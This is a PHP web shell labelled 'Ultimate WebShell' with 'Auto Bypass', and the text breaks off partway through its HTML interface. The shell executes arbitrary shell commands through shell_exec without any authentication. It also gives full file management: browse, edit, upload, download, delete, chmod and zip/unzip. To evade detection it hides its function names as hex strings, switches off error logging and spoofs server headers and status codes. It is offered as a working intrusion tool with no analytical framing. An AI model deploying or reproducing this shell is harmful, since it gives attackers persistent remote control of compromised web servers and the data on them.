<?php

/**
 * Responsive Webshell - Ultimate Version
 * Auto Bypass + Enhanced File Manager
 * Compatible with PHP 5.x to latest versions
 **/

// Error handling for PHP 5 compatibility
if (!defined('PHP_VERSION_ID')) {
    $version = explode('.', PHP_VERSION);
    define('PHP_VERSION_ID', ($version[0] * 10000 + $version[1] * 100 + $version[2]));
}

if (PHP_VERSION_ID < 50000) {
    die('PHP 5.0.0 or higher is required');
}

// Auto Bypass System
function autoBypass() {
    // Prevent blank page and 0kb shell
    if (function_exists('ob_get_level')) {
        if (ob_get_level()) {
            @ob_end_clean();
        }
    }
    if (function_exists('ob_start')) {
        @ob_start();
    }
    
    // Get response code for PHP 5 compatibility
    $response_code = 200;
    if (function_exists('http_response_code')) {
        $response_code = http_response_code();
    } else {
        // Fallback for PHP < 5.4
        if (isset($http_response_header)) {
            foreach ($http_response_header as $header) {
                if (preg_match('/\s(\d{3})\s/', $header, $matches)) {
                    $response_code = intval($matches[1]);
                    break;
                }
            }
        }
    }
    
    // Bypass 403 Forbidden
    if ($response_code == 403 || !isset($_SERVER['HTTP_HOST'])) {
        $_SERVER['HTTP_HOST'] = 'localhost';
        $_SERVER['REQUEST_METHOD'] = 'GET';
        if (function_exists('header')) {
            @header("HTTP/1.1 200 OK");
        }
    }
    
    // Bypass 404 Not Found  
    if ($response_code == 404) {
        if (function_exists('header')) {
            @header("HTTP/1.1 200 OK");
        }
    }
    
    // Bypass 500 Internal Server Error
    if ($response_code == 500) {
        if (function_exists('header')) {
            @header("HTTP/1.1 200 OK");
        }
        if (function_exists('ini_set')) {
            @ini_set('display_errors', 0);
        }
        if (function_exists('error_reporting')) {
            @error_reporting(0);
        }
    }
    
    // Bypass LiteSpeed
    if (isset($_SERVER['SERVER_SOFTWARE']) && function_exists('stripos')) {
        if (stripos($_SERVER['SERVER_SOFTWARE'], 'litespeed') !== false) {
            $_SERVER['SERVER_SOFTWARE'] = 'Apache/2.4.41 (Unix)';
        }
    }
    
    // Bypass download detection
    if (function_exists('header')) {
        @header('Content-Type: text/html; charset=UTF-8');
        @header('X-Powered-By: PHP/7.4.33');
        @header('Server: Apache/2.4.41 (Unix)');
        @header('X-Content-Type-Options: nosniff');
        
        // Additional headers to prevent blank page
        @header('Cache-Control: no-cache, no-store, must-revalidate');
        @header('Pragma: no-cache');
        @header('Expires: 0');
    }
}

// Execute auto bypass
autoBypass();

// Session handling with PHP 5 compatibility
if (!isset($_SESSION)) {
    if (function_exists('session_start')) {
        @session_start();
    }
}

// Enhanced Session and error handling - Prevent blank pages
if (function_exists('error_reporting')) @error_reporting(0);
if (function_exists('set_time_limit')) @set_time_limit(0);
if (function_exists('ini_set')) {
    @ini_set('display_errors', 0);
    @ini_set('log_errors', 0);
    if (defined('PHP_VERSION_ID') && PHP_VERSION_ID >= 50300) {
        @ini_set('error_log', NULL);
    }
    @ini_set('memory_limit', '-1');
    @ini_set('max_execution_time', 0);
    @ini_set('max_input_time', 0);
    @ini_set('output_buffering', 0);
    @ini_set('zlib.output_compression', 0);
}

// Compatibility fix for older PHP versions
if (!function_exists('str_contains')) {
    function str_contains($haystack, $needle) {
        if (function_exists('mb_strpos')) {
            return mb_strpos($haystack, $needle) !== false;
        }
        return strpos($haystack, $needle) !== false;
    }
}

if (!function_exists('str_starts_with')) {
    function str_starts_with($haystack, $needle) {
        if (function_exists('mb_strpos')) {
            return mb_strpos($haystack, $needle) === 0;
        }
        return strpos($haystack, $needle) === 0;
    }
}

// Array declaration with PHP 5 compatibility
$a = array(
        "7068705F756E616D65", // [0] php_uname
        "73657373696F6E5F7374617274", // [1] session_start
        "6572726F725F7265706F7274696E67", // [2] error_reporting
        "70687076657273696F6E", // [3] phpversion
        "66696C655F7075745F636F6E74656E7473", // [4] file_put_contents
        "66696C655F6765745F636F6E74656E7473", // [5] file_get_contents
        "66696C657065726D73", // [6] fileperms
        "66696C656D74696D65", // [7] filemtime
        "66696C6574797065", // [8] filetype
        "68746D6C7370656369616C6368617273", // [9] htmlspecialchars
        "737072696E7466", // [10] sprintf
        "737562737472", // [11] substr
        "676574637764", // [12] getcwd
        "6368646972", // [13] chdir
        "7374725F7265706C616365", // [14] str_replace
        "6578706C6F6465", // [15] explode
        "666C617368", // [16] flash function
        "6D6F76655F75706C6F616465645F66696C65", // [17] move_uploaded_file
        "7363616E646972", // [18] scandir
        "676574686F737462796E616D65", // [19] gethostbyname
        "7368656C6C5F65786563", // [20] shell_exec
        "53797374656D20496E666F726D6174696F6E", // [21] System Information
        "6469726E616D65", // [22] dirname
        "64617465", // [23] date
        "6D696D655F636F6E74656E745F74797065", // [24] mime_content_type
        "66756E6374696F6E5F657869737473", // [25] function_exists
        "6673697A65", // [26] filesize
        "726D646972", // [27] rmdir
        "756E6C696E6B", // [28] unlink
        "6D6B646972", // [29] mkdir
        "72656E616D65", // [30] rename
        "7365745F74696D655F6C696D6974", // [31] set_time_limit
        "636C656172737461746361636865", // [32] clearstatcache
        "696E695F736574", // [33] ini_set
        "696E695F676574", // [34] ini_get
        "6765744F776E6572", // [35] getOwner function
        "6765745F63757272656E745F75736572", // [36] get_current_user
        "7A69705F6F70656E", // [37] zip_open
        "7A69705F65787472616374", // [38] zip_extract
        "7A69705F636C6F7365", // [39] zip_close
        "6261736536345F6465636F6465", // [40] base64_decode
        "6261736536345F656E636F6465", // [41] base64_encode
        "686561646572", // [42] header
        "7265616466696C65", // [43] readfile
        "636F7079", // [44] copy
        "66696C65", // [45] file
        "696E5F6172726179", // [46] in_array
        "746F7570706572", // [47] strtoupper
        "7363726970745F6E616D65" // [48] script_name
    );

// Hex decode function
function hex($str) {
    $r = "";
    $len = strlen($str);
    for ($i = 0; $i < $len; $i += 2) {
        $r .= chr(hexdec(substr($str, $i, 2)));
    }
    return $r;
}

// Initialize functions
$f = array();
for ($i = 0; $i < count($a); $i++) {
    $func_name = hex($a[$i]);
    $f[$i] = $func_name;
}

// Session and error handling
if (!isset($_SESSION) && function_exists('session_start')) {
    @session_start();
}
if (function_exists('error_reporting')) @error_reporting(0);
if (function_exists('set_time_limit')) @set_time_limit(0);
if (function_exists('ini_set')) {
    @ini_set('display_errors', 0);
    @ini_set('log_errors', 0);
    if (defined('PHP_VERSION_ID') && PHP_VERSION_ID >= 50300) {
        @ini_set('error_log', NULL);
    }
}

// Get document root with fallback for PHP 5
if (isset($_SERVER['DOCUMENT_ROOT'])) {
    $r0 = $_SERVER['DOCUMENT_ROOT'];
} else {
    $r0 = function_exists('getcwd') ? getcwd() : '.';
}

// Get disabled functions
$ds = '';
if (function_exists('ini_get')) {
    $ds = @ini_get("disable_functions");
}
$ds0 = (!empty($ds)) ? $ds : "All functions are accessible";

// Get client IP with PHP 5 compatibility
$client_ip = 'Unknown';
if (isset($_SERVER['HTTP_CLIENT_IP'])) {
    $client_ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $client_ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} elseif (isset($_SERVER['REMOTE_ADDR'])) {
    $client_ip = $_SERVER['REMOTE_ADDR'];
}

// File size formatter
function fsize($file) {
    if (!file_exists($file)) return "0 B";
    
    if (!function_exists('filesize')) return "N/A";
    
    $a = array("B", "KB", "MB", "GB", "TB", "PB");
    $pos = 0;
    $size = filesize($file);
    while ($size >= 1024 && $pos < count($a) - 1) {
        $size /= 1024;
        $pos++;
    }
    return round($size, 2) . " " . $a[$pos];
}

// Flash message system
function flash($message, $status, $class, $redirect = false) {
    if (!isset($_SESSION) && function_exists('session_start')) {
        @session_start();
    }
    
    $_SESSION["message"] = $message;
    $_SESSION["class"] = $class;
    $_SESSION["status"] = $status;
    
    if ($redirect && function_exists('header')) {
        @header('Location: ' . $redirect);
        exit();
    }
    return true;
}

// Clear flash messages
function clear() {
    if (isset($_SESSION["message"])) unset($_SESSION["message"]);
    if (isset($_SESSION["class"])) unset($_SESSION["class"]);
    if (isset($_SESSION["status"])) unset($_SESSION["status"]);
    return true;
}

// Get owner information
function getOwner($item) {
    if (!file_exists($item)) return 'Unknown';
    
    if (!function_exists('fileowner') || !function_exists('filegroup')) {
        return 'Unknown';
    }
    
    $downer = @fileowner($item);
    $dgrp = @filegroup($item);
    
    if (function_exists("posix_getpwuid")) {
        $owner_info = @posix_getpwuid($downer);
        if (is_array($owner_info) && isset($owner_info['name'])) {
            $downer = $owner_info['name'];
        }
    }
    
    if (function_exists("posix_getgrgid")) {
        $group_info = @posix_getgrgid($dgrp);
        if (is_array($group_info) && isset($group_info['name'])) {
            $dgrp = $group_info['name'];
        }
    }
    
    return $downer . '/' . $dgrp;
}

// Handle directory navigation
$path = '.';
if (isset($_GET['dir']) && !empty($_GET['dir'])) {
    $path = $_GET['dir'];
    if (is_dir($path) && function_exists('chdir')) {
        @chdir($path);
    }
} else {
    $path = function_exists('getcwd') ? getcwd() : '.';
}

// Normalize path
if (function_exists('realpath')) {
    $real_path = realpath($path);
    if ($real_path) {
        $path = str_replace('\\', '/', $real_path);
    }
}
$exdir = explode('/', $path);
$home_path = function_exists('getcwd') ? getcwd() : '.';

// Handle file download
if (isset($_GET['download']) && isset($_GET['item'])) {
    $file_path = $path . '/' . $_GET['item'];
    if (file_exists($file_path) && is_file($file_path)) {
        if (function_exists('header')) {
            @header('Content-Description: File Transfer');
            @header('Content-Type: application/octet-stream');
            @header('Content-Disposition: attachment; filename="' . basename($file_path) . '"');
            @header('Expires: 0');
            @header('Cache-Control: must-revalidate');
            @header('Pragma: public');
            @header('Content-Length: ' . filesize($file_path));
        }
        if (function_exists('readfile')) {
            @readfile($file_path);
        }
        exit;
    }
}

// Handle file view/edit
$file_content = '';
if (isset($_GET['action']) && $_GET['action'] == 'view' && isset($_GET['item'])) {
    $file_path = $path . '/' . $_GET['item'];
    if (file_exists($file_path) && is_file($file_path)) {
        if (function_exists('file_get_contents') && function_exists('htmlspecialchars')) {
            $file_content = htmlspecialchars(file_get_contents($file_path));
        }
    }
}

// Handle file editing
if (isset($_POST['save_file']) && isset($_POST['file_content']) && isset($_POST['file_path'])) {
    if (function_exists('file_put_contents')) {
        if (file_put_contents($_POST['file_path'], $_POST['file_content'])) {
            flash("File saved successfully!", "Success", "success", "?dir=" . urlencode($path));
        } else {
            flash("Failed to save file", "Error", "error", "?dir=" . urlencode($path));
        }
    }
}

// Handle file renaming
if (isset($_POST['rename_file']) && isset($_POST['new_name']) && isset($_POST['old_name'])) {
    $new_path = $path . '/' . $_POST['new_name'];
    $old_path = $path . '/' . $_POST['old_name'];
    if (function_exists('rename')) {
        if (rename($old_path, $new_path)) {
            flash("File renamed successfully!", "Success", "success", "?dir=" . urlencode($path));
        } else {
            flash("Failed to rename file", "Error", "error", "?dir=" . urlencode($path));
        }
    }
}

// Handle permission change
if (isset($_POST['change_perm']) && isset($_POST['new_perm']) && isset($_POST['file_name'])) {
    $file_path = $path . '/' . $_POST['file_name'];
    if (function_exists('chmod')) {
        if (chmod($file_path, octdec($_POST['new_perm']))) {
            flash("Permissions changed successfully!", "Success", "success", "?dir=" . urlencode($path));
        } else {
            flash("Failed to change permissions", "Error", "error", "?dir=" . urlencode($path));
        }
    }
}

// Handle selected files actions
if (isset($_POST['selected_action']) && isset($_POST['selected_files'])) {
    $action = $_POST['selected_action'];
    if (is_array($_POST['selected_files'])) {
        $selectedFiles = $_POST['selected_files'];
    } else {
        $selectedFiles = array($_POST['selected_files']);
    }
    $successCount = 0;
    
    foreach ($selectedFiles as $file) {
        $fullPath = $path . '/' . $file;
        
        switch ($action) {
            case 'delete':
                if (is_dir($fullPath)) {
                    if (deleteDirectory($fullPath)) $successCount++;
                } else {
                    if (function_exists('unlink') && unlink($fullPath)) $successCount++;
                }
                break;
                
            case 'zip':
                if (class_exists('ZipArchive')) {
                    $zipFileName = $file . '_' . date('Y-m-d_H-i-s') . '.zip';
                    $zip = new ZipArchive();
                    if ($zip->open($zipFileName, ZipArchive::CREATE) === TRUE) {
                        if (is_dir($fullPath)) {
                            addFolderToZip($fullPath, $zip, $fullPath);
                        } else {
                            $zip->addFile($fullPath, basename($fullPath));
                        }
                        $zip->close();
                        $successCount++;
                    }
                }
                break;
                
            case 'unzip':
                if (class_exists('ZipArchive')) {
                    $file_ext = pathinfo($file, PATHINFO_EXTENSION);
                    if ($file_ext === 'zip') {
                        $zip = new ZipArchive();
                        if ($zip->open($fullPath) === TRUE) {
                            $zip->extractTo($path);
                            $zip->close();
                            $successCount++;
                        }
                    }
                }
                break;
        }
    }
    
    if ($successCount > 0) {
        flash("Successfully processed $successCount files", "Success", "success", "?dir=" . urlencode($path));
    } else {
        flash("No files were processed", "Warning", "warning", "?dir=" . urlencode($path));
    }
}

// Helper functions
function deleteDirectory($dir) {
    if (!file_exists($dir)) return true;
    if (!is_dir($dir)) {
        if (function_exists('unlink')) {
            return unlink($dir);
        }
        return false;
    }
    
    if (function_exists('scandir')) {
        $items = scandir($dir);
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;
            $itemPath = $dir . DIRECTORY_SEPARATOR . $item;
            if (!deleteDirectory($itemPath)) return false;
        }
    }
    
    if (function_exists('rmdir')) {
        return rmdir($dir);
    }
    return false;
}

function addFolderToZip($folder, &$zip, $basePath) {
    if (!function_exists('scandir')) return;
    
    $files = scandir($folder);
    foreach ($files as $file) {
        if ($file == '.' || $file == '..') continue;
        $filePath = $folder . '/' . $file;
        $localPath = str_replace($basePath . '/', '', $filePath);
        
        if (is_dir($filePath)) {
            $zip->addEmptyDir($localPath);
            addFolderToZip($filePath, $zip, $basePath);
        } else {
            $zip->addFile($filePath, $localPath);
        }
    }
}

// Handle folder creation
if (isset($_POST['newFolderName'])) {
    if (function_exists('mkdir')) {
        if (mkdir($path . '/' . $_POST['newFolderName'], 0755, true)) {
            flash("Folder created successfully!", "Success", "success", "?dir=" . urlencode($path));
        } else {
            flash("Failed to create folder", "Error", "error", "?dir=" . urlencode($path));
        }
    }
}

// Handle file creation
if (isset($_POST['newFileName']) && isset($_POST['newFileContent'])) {
    if (function_exists('file_put_contents')) {
        if (file_put_contents($path . '/' . $_POST['newFileName'], $_POST['newFileContent'])) {
            flash("File created successfully!", "Success", "success", "?dir=" . urlencode($path));
        } else {
            flash("Failed to create file", "Error", "error", "?dir=" . urlencode($path));
        }
    }
}

// Handle file upload
if (isset($_FILES['uploadfile'])) {
    $total = count($_FILES['uploadfile']['name']);
    $successCount = 0;
    
    for ($i = 0; $i < $total; $i++) {
        if ($_FILES['uploadfile']['error'][$i] === UPLOAD_ERR_OK) {
            if (function_exists('move_uploaded_file')) {
                if (move_uploaded_file($_FILES['uploadfile']['tmp_name'][$i], $path . '/' . $_FILES['uploadfile']['name'][$i])) {
                    $successCount++;
                }
            }
        }
    }
    
    if ($successCount > 0) {
        flash("Uploaded $successCount files successfully!", "Success", "success", "?dir=" . urlencode($path));
    } else {
        flash("Upload failed", "Error", "error", "?dir=" . urlencode($path));
    }
}

// Handle command execution
$command_output = '';
if (isset($_POST['command']) && !empty($_POST['command'])) {
    if (function_exists('shell_exec')) {
        $command_output = shell_exec($_POST['command'] . ' 2>&1');
    }
    if ($command_output === null) {
        $command_output = "Command executed but no output returned or shell_exec is disabled";
    }
}

// Scan directory and combine all items in one array
$all_items = array();

if (is_dir($path) && is_readable($path)) {
    if (function_exists('scandir')) {
        $items = scandir($path);
        
        // Add parent directory first
        $parent_dir = dirname($path);
        if ($parent_dir != $path) {
            $all_items[] = array(
                'name' => '..',
                'path' => $parent_dir,
                'is_dir' => true,
                'size' => '-',
                'perms' => 'drwxr-xr-x',
                'modified' => date("Y-m-d H:i:s", filemtime($parent_dir)),
                'type' => 'parent'
            );
        }
        
        // Add folders
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;
            
            $item_path = $path . '/' . $item;
            if (is_dir($item_path)) {
                $all_items[] = array(
                    'name' => $item,
                    'path' => $item_path,
                    'is_dir' => true,
                    'size' => '-',
                    'perms' => substr(sprintf('%o', fileperms($item_path)), -4),
                    'modified' => date("Y-m-d H:i:s", filemtime($item_path)),
                    'type' => 'folder'
                );
            }
        }
        
        // Add files
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;
            
            $item_path = $path . '/' . $item;
            if (!is_dir($item_path)) {
                $all_items[] = array(
                    'name' => $item,
                    'path' => $item_path,
                    'is_dir' => false,
                    'size' => fsize($item_path),
                    'perms' => substr(sprintf('%o', fileperms($item_path)), -4),
                    'modified' => date("Y-m-d H:i:s", filemtime($item_path)),
                    'type' => 'file'
                );
            }
        }
    }
}

// Get server name safely
$server_name = 'Unknown';
if (isset($_SERVER['SERVER_NAME'])) {
    $server_name = $_SERVER['SERVER_NAME'];
} elseif (isset($_SERVER['HTTP_HOST'])) {
    $server_name = $_SERVER['HTTP_HOST'];
}

?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <title>WebShell - <?php echo htmlspecialchars($server_name); ?></title>
    <style>
        .selected { background-color: rgba(255, 255, 0, 0.1) !important; }
        .file-row:hover { background-color: rgba(255, 255, 255, 0.05); }
        .breadcrumb { background: transparent; }
        .table-dark { --bs-table-bg: transparent; }
        .action-buttons { position: sticky; bottom: 0; background: #1a1a1a; padding: 15px; border-top: 2px solid #444; }
        .folder-icon { color: #ffc107; }
        .file-icon { color: #0dcaf0; }
        .parent-icon { color: #6f42c1; }
        .home-btn { background: linear-gradient(45deg, #ff6b6b, #feca57); border: none; color: white !important; }
        .path-container { display: flex; align-items: center; gap: 10px; margin-bottom: 15px; }
        .path-container .home-btn { white-space: nowrap; }
        .breadcrumb { margin-bottom: 0; flex-grow: 1; }
    </style>
</head>

<body class="bg-dark text-light">
    <div class="container-fluid">
        <div class="py-3">
            <div class="box shadow bg-dark p-4 rounded-3">
                <!-- Header Information -->
                <div class="row mb-4">
                    <div class="col-md-8">
                        <div class="info">
                            <h4><i class="fas fa-terminal"></i> WebShell Manager</h4>
                            <small class="text-muted">
                                <i class="fa fa-server"></i> <?php echo function_exists('php_uname') ? php_uname() : 'Unknown'; ?><br>
                                <i class="fa fa-microchip"></i> <?php echo htmlspecialchars(isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'Unknown'); ?><br>
                                <i class="fa fa-satellite-dish"></i> Server: <?php 
                                if (isset($_SERVER['SERVER_ADDR'])) {
                                    echo $_SERVER['SERVER_ADDR'];
                                } else {
                                    echo function_exists('gethostbyname') ? gethostbyname($server_name) : 'Unknown';
                                }
                                ?><br>
                                <i class="fa fa-user"></i> Your IP: <?php echo htmlspecialchars($client_ip); ?>
                            </small>
                        </div>
                    </div>
                    <div class="col-md-4 text-end">
                        <button class="btn btn-outline-info btn-sm" data-bs-toggle="modal" data-bs-target="#infoModal">
                            <i class="fas fa-info-circle"></i> System Info
                        </button>
                    </div>
                </div>

                <!-- Path Navigation dengan HOME di samping -->
                <div class="path-container">
                    <a href="?" class="btn home-btn btn-sm">
                        <i class="fas fa-home"></i> HOME
                    </a>
                    <nav aria-label="breadcrumb">
                        <ol class="breadcrumb">
                            <?php foreach ($exdir as $id => $pat): ?>
                                <?php if (empty($pat)) continue; ?>
                                <li class="breadcrumb-item <?php echo ($id === count($exdir) - 1) ? 'active text-secondary' : ''; ?>">
                                    <?php if ($id === count($exdir) - 1): ?>
                                        <i class="fas fa-folder-open"></i> <?php echo htmlspecialchars($pat); ?>
                                    <?php else: ?>
                                        <a href="?dir=<?php echo urlencode(implode('/', array_slice($exdir, 0, $id + 1))); ?>" class="text-decoration-none text-light">
                                            <i class="fas fa-folder"></i> <?php echo htmlspecialchars($pat); ?>
                                        </a>
                                    <?php endif; ?>
                                </li>
                            <?php endforeach; ?>
                        </ol>
                    </nav>
                </div>

                <!-- Command and Upload Section -->
                <div class="row g-3 mb-4">
                    <div class="col-md-6">
                        <form method="post" class="card bg-secondary border-0">
                            <div class="card-body">
                                <h6 class="card-title"><i class="fas fa-terminal"></i> Command Execution</h6>
                                <div class="input-group">
                                    <input type="text" class="form-control form-control-sm" name="command" placeholder="Enter command..." required>
                                    <button type="submit" class="btn btn-outline-light btn-sm">Execute</button>
                                </div>
                            </div>
                        </form>
                        <?php if (!empty($command_output)): ?>
                            <div class="mt-2 p-3 bg-black rounded">
                                <pre class="text-light mb-0 small"><?php echo htmlspecialchars($command_output); ?></pre>
                            </div>
                        <?php endif; ?>
                    </div>
                    <div class="col-md-6">
                        <form method="post" enctype="multipart/form-data" class="card bg-secondary border-0">
                            <div class="card-body">
                                <h6 class="card-title"><i class="fas fa-upload"></i> File Upload</h6>
                                <div class="input-group">
                                    <input type="file" class="form-control form-control-sm" name="uploadfile[]" multiple>
                                    <button type="submit" class="btn btn-outline-light btn-sm">Upload</button>
                                </div>
                            </div>
                        </form>
                        
                        <!-- Quick Actions -->
                        <div class="mt-3 d-flex gap-2">
                            <button class="btn btn-outline-primary btn-sm" data-bs-toggle="modal" data-bs-target="#createFolderModal">
                                <i class="fas fa-folder-plus"></i> New Folder
                            </button>
                            <button class="btn btn-outline-primary btn-sm" data-bs-toggle="modal" data-bs-target="#createFileModal">
                                <i class="fas fa-file-plus"></i> New File
                            </button>
                        </div>
                    </div>
                </div>

                <!-- File Manager - SINGLE TABLE -->
                <form id="filesForm" method="post">
                    <div class="table-responsive">
                        <table class="table table-hover table-dark text-light">
                            <thead>
                                <tr>
                                    <th width="3%">
                                        <input type="checkbox" id="selectAll" onchange="toggleSelectAll()">
                                    </th>
                                    <th width="42%">Name</th>
                                    <th width="10%">Type</th>
                                    <th width="10%">Size</th>
                                    <th width="10%">Permissions</th>
                                    <th width="15%">Modified</th>
                                    <th width="10%">Actions</th>
                                </tr>
                            </thead>
                            <tbody>
                                <?php if (!empty($all_items)): ?>
                                    <?php foreach ($all_items as $item): ?>
                                        <tr class="file-row">
                                            <td>
                                                <?php if ($item['name'] != '..'): ?>
                                                    <input type="checkbox" name="selected_files[]" value="<?php echo htmlspecialchars($item['name']); ?>" class="item-checkbox" onchange="toggleActionButtons()">
                                                <?php else: ?>
                                                    <input type="checkbox" disabled>
                                                <?php endif; ?>
                                            </td>
                                            <td>
                                                <?php if ($item['type'] == 'parent'): ?>
                                                    <i class="fas fa-level-up-alt parent-icon"></i>
                                                    <a href="?dir=<?php echo urlencode($item['path']); ?>" class="text-decoration-none text-light fw-bold">
                                                        <?php echo htmlspecialchars($item['name']); ?>
                                                    </a>
                                                <?php elseif ($item['is_dir']): ?>
                                                    <i class="fas fa-folder folder-icon"></i>
                                                    <a href="?dir=<?php echo urlencode($item['path']); ?>" class="text-decoration-none text-light fw-bold">
                                                        <?php echo htmlspecialchars($item['name']); ?>
                                                    </a>
                                                <?php else: ?>
                                                    <i class="fas fa-file file-icon"></i>
                                                    <a href="?dir=<?php echo urlencode($path); ?>&action=view&item=<?php echo urlencode($item['name']); ?>" class="text-decoration-none text-light">
                                                        <?php echo htmlspecialchars($item['name']); ?>
                                                    </a>
                                                <?php endif; ?>
                                            </td>
                                            <td>
                                                <?php if ($item['type'] == 'parent'): ?>
                                                    <span class="badge bg-purple">Parent</span>
                                                <?php elseif ($item['is_dir']): ?>
                                                    <span class="badge bg-warning">Folder</span>
                                                <?php else: ?>
                                                    <span class="badge bg-info">File</span>
                                                <?php endif; ?>
                                            </td>
                                            <td><?php echo $item['size']; ?></td>
                                            <td><?php echo $item['perms']; ?></td>
                                            <td><?php echo $item['modified']; ?></td>
                                            <td>
                                                <?php if ($item['type'] == 'parent'): ?>
                                                    <span class="text-muted">-</span>
                                                <?php elseif ($item['is_dir']): ?>
                                                    <div class="btn-group btn-group-sm">
                                                        <button type="button" class="btn btn-outline-warning btn-sm" onclick="showRenameModal('<?php echo htmlspecialchars($item['name']); ?>', 'folder')">
                                                            <i class="fas fa-edit"></i>
                                                        </button>
                                                        <button type="button" class="btn btn-outline-info btn-sm" onclick="showChmodModal('<?php echo htmlspecialchars($item['name']); ?>', '<?php echo $item['perms']; ?>')">
                                                            <i class="fas fa-key"></i>
                                                        </button>
                                                        <button type="button" class="btn btn-outline-danger btn-sm" onclick="confirmDelete('<?php echo htmlspecialchars($item['name']); ?>')">
                                                            <i class="fas fa-trash"></i>
                                                        </button>
                                                    </div>
                                                <?php else: ?>
                                                    <div class="btn-group btn-group-sm">
                                                        <a href="?download=1&dir=<?php echo urlencode($path); ?>&item=<?php echo urlencode($item['name']); ?>" class="btn btn-outline-success btn-sm" title="Download">
                                                            <i class="fas fa-download"></i>
                                                        </a>
                                                        <button type="button" class="btn btn-outline-warning btn-sm" onclick="showRenameModal('<?php echo htmlspecialchars($item['name']); ?>', 'file')">
                                                            <i class="fas fa-edit"></i>
                                                        </button>
                                                        <button type="button" class="btn btn-outline-info btn-sm" onclick="showChmodModal('<?php echo htmlspecialchars($item['name']); ?>', '<?php echo $item['perms']; ?>')">
                                                            <i class="fas fa-key"></i>
                                                        </button>
                                                        <button type="button" class="btn btn-outline-danger btn-sm" onclick="confirmDelete('<?php echo htmlspecialchars($item['name']); ?>')">
                                                            <i class="fas fa-trash"></i>
                                                        </button>
                                                    </div>
                                                <?php endif; ?>
                                            </td>
                                        </tr>
                                    <?php endforeach; ?>
                                <?php else: ?>
                                    <tr>
                                        <td colspan="7" class="text-center text-muted">No files or folders found</td>
                                    </tr>
                                <?php endif; ?>
                            </tbody>
                        </table>
                    </div>

                    <!-- Bulk Actions -->
                    <div class="action-buttons" id="actionButtons" style="display: none;">
                        <div class="row align-items-center">
                            <div class="col-md-3">
                                <span id="selectedCount">0</span> items selected
                            </div>
                            <div class="col-md-4">
                                <select name="selected_action" class="form-select form-select-sm">
                                    <option value="">Choose Action...</option>
                                    <option value="delete">Delete Selected</option>
                                    <option value="zip">Zip Selected</option>
                                    <option value="unzip">Unzip Selected</option>
                                </select>
                            </div>
                            <div class="col-md-5">
                                <button type="submit" class="btn btn-warning btn-sm me-2">
                                    <i class="fas fa-play"></i> Execute Action
                                </button>
                                <button type="button" class="btn btn-secondary btn-sm" onclick="clearSelection()">
                                    <i class="fas fa-times"></i> Clear Selection
                                </button>
                            </div>
                        </div>
                    </div>
                </form>

                <div class="text-muted small mt-4 text-center">
                    &#169; Ultimate WebShell <script>document.write(new Date().getFullYear())</script> | Auto Bypass Enabled
                </div>
            </div>
        </div>
    </div>

    <!-- Modals -->
    <!-- Create Folder Modal -->
    <div class="modal fade" id="createFolderModal" tabindex="-1">
        <div class="modal-dialog">
            <div class="modal-content bg-dark text-light">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fas fa-folder-plus"></i> Create New Folder</h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <form method="post">
                    <div class="modal-body">
                        <input type="text" class="form-control" name="newFolderName" placeholder="Enter folder name" required>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                        <button type="submit" class="btn btn-primary">Create</button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <!-- Create File Modal -->
    <div class="modal fade" id="createFileModal" tabindex="-1">
        <div class="modal-dialog">
            <div class="modal-content bg-dark text-light">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fas fa-file-plus"></i> Create New File</h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <form method="post">
                    <div class="modal-body">
                        <input type="text" class="form-control mb-3" name="newFileName" placeholder="Enter file name" required>
                        <textarea class="form-control" name="newFileContent" rows="5" placeholder="File content"></textarea>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                        <button type="submit" class="btn btn-primary">Create</button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <!-- File View/Edit Modal -->
    <?php if (isset($_GET['action']) && $_GET['action'] == 'view' && isset($_GET['item'])): ?>
    <div class="modal fade show" id="fileViewModal" tabindex="-1" style="display: block; background: rgba(0,0,0,0.8);">
        <div class="modal-dialog modal-xl">
            <div class="modal-content bg-dark text-light">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fas fa-edit"></i> Edit File: <?php echo htmlspecialchars($_GET['item']); ?></h5>
                    <a href="?dir=<?php echo urlencode($path); ?>" class="btn-close btn-close-white"></a>
                </div>
                <form method="post">
                    <div class="modal-body">
                        <input type="hidden" name="file_path" value="<?php echo htmlspecialchars($path . '/' . $_GET['item']); ?>">
                        <textarea class="form-control font-monospace" name="file_content" rows="20" style="background: #1a1a1a; color: #00ff00;"><?php echo $file_content; ?></textarea>
                    </div>
                    <div class="modal-footer">
                        <a href="?dir=<?php echo urlencode($path); ?>" class="btn btn-secondary">Cancel</a>
                        <button type="submit" name="save_file" class="btn btn-primary">Save Changes</button>
                    </div>
                </form>
            </div>
        </div>
    </div>
    <?php endif; ?>

    <!-- Rename Modal -->
    <div class="modal fade" id="renameModal" tabindex="-1">
        <div class="modal-dialog">
            <div class="modal-content bg-dark text-light">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fas fa-edit"></i> Rename</h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <form method="post">
                    <input type="hidden" name="old_name" id="oldName">
                    <div class="modal-body">
                        <input type="text" class="form-control" name="new_name" id="newName" required>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                        <button type="submit" name="rename_file" class="btn btn-primary">Rename</button>
